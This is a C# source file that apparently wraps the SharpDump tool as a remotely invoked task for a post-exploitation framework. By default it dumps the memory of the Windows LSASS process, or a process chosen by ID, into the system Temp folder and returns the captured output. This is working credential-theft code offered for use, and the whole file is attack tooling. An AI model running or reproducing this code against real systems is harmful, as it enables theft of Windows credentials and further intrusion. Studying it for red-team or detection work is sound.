using System;
using System.IO;

using SharpDump;

public static class Task
{
    public static string Execute(string ProcessID = "")
    {
        string output = "";
        try
        {
            TextWriter realStdOut = Console.Out;
            TextWriter realStdErr = Console.Error;
            TextWriter stdOutWriter = new StringWriter();
            TextWriter stdErrWriter = new StringWriter();
            Console.SetOut(stdOutWriter);
            Console.SetError(stdErrWriter);
            
            string[] args = ProcessID.Split(' ');

            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string dumpDir = String.Format("{0}\\Temp\\", systemRoot);
            if (!Directory.Exists(dumpDir))
            {
                Console.WriteLine(String.Format("\n[X] Dump directory \"{0}\" doesn't exist!\n", dumpDir));
            }
            else
            {
                if (ProcessID.Length == 0)
                {
                    // dump LSASS by default
                    Program.Minidump();
                }
                else if (args.Length == 1)
                {
                    int retNum;
                    if (int.TryParse(Convert.ToString(args[0]), System.Globalization.NumberStyles.Any, System.Globalization.NumberFormatInfo.InvariantInfo, out retNum))
                    {
                        // arg is a number, so we're specifying a PID
                        Program.Minidump(retNum);
                    }
                    else
                    {
                        Console.WriteLine("\nPlease use \"SharpDump.exe [pid]\" format\n");
                    }
                }
                else if (args.Length == 2)
                {
                    Console.WriteLine("\nPlease use \"SharpDump.exe [pid]\" format\n");
                }
            }
            
            Console.Out.Flush();
            Console.Error.Flush();
            Console.SetOut(realStdOut);
            Console.SetError(realStdErr);
            
            output += stdOutWriter.ToString();
            output += stdErrWriter.ToString();
        }
        catch (Exception e) { output += e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        return output;
    }
}